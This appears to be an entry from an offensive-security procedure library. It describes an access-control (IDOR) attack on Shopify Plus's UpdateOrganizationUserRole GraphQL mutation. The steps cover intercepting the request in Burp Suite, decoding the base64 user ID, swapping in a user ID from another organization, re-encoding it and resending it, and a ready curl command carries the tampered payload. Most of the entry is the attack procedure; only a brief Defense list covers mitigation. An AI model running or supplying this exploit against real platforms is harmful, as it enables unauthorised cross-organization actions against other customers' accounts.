---
tags:
  - graphql
  - request-modification
  - burp
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-graphql-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:44.851Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 1ac0d8bc-87ce-4711-bd69-ebeb9538b286
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Initiate-and-Modify-Role-Change-Request

## Summary

This procedure initiates a role change for a user in Shopify Plus, intercepts the GraphQL mutation request, and modifies the target user ID to point to a user in another organization, exploiting improper access controls.

## Description

Targeting the UpdateOrganizationUserRole mutation at https://shopify.plus/[org-id]/users/api, this procedure captures the POST request via a proxy, decodes the base64-encoded user ID (e.g., gid://organization/OrganizationUser/34057938), replaces it with a target ID (e.g., 34071632 from another org), re-encodes it, and resends. The backend fails validation but processes enough to trigger notifications. Prerequisites include admin access and proxy setup.

## Requirements

1. Proxy tool like Burp Suite configured for browser traffic
2. Knowledge of a target user ID from another organization (e.g., via prior recon)
3. Role ID from setup procedure

## Defense

Defensive measures and detection strategies:

- Validate organization ownership of user IDs in GraphQL resolvers
- Log and alert on cross-organization mutation attempts
- Disable or sanitize notifications on failed mutations

## Objectives

1. Capture legitimate role change request
2. Tamper with user ID to target external organization
3. Forward modified request to trigger backend processing

## Instructions

### Step 1: Initiate Role Change

**Context**: From the user page, start the role change to generate the GraphQL request.

In Access and permissions > Role, click Change access > Change role.

> This triggers a POST to /users/api with UpdateOrganizationUserRole mutation.

### Step 2: Intercept Request with Burp Suite

**Context**: Capture the request for modification.

Configure browser proxy to Burp; intercept the POST containing variables like {"id":"Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNTc5Mzg=","roleId":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjYxAAA="}.

> Request body includes the full GraphQL query.

### Step 3: Modify and Resend Request

**Context**: Alter the user ID and forward to exploit the vulnerability.

Base64-decode 'id', change numeric part to target (e.g., 34071632), re-encode to Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=, update variables, and forward. Alternatively, simulate with [[commands/curl-graphql-mutation]]:

```bash
curl -X POST https://shopify.plus/[org-id]/users/api \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation UpdateOrganizationUserRole($id: ID!, $roleId: ID!) { updateOrganizationUserRole(id: $id, roleId: $roleId) { user { id } role { id } } }","variables":{"id":"Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=","roleId":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjYxAAA="}}'
```

> Request sent with tampered ID; expect error but notification trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-mutation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[graphql]]
- [[request-modification]]
